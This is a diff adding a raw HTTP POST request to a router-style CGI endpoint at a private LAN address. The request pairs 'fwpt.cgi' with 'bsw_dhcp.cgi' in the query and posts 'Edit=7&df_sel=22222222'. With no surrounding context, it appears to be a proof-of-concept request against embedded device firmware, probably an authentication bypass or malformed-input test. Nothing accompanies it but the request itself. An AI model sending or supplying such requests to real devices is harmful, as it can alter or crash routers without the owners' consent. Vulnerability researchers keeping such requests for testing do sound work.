@@ -1,0 +1,5 @@
+POST /fwpt.cgi?bsw_dhcp.cgi HTTP/1.1
+HOST: 192.168.0.50
+Content-Length: 22
+
+Edit=7&df_sel=22222222
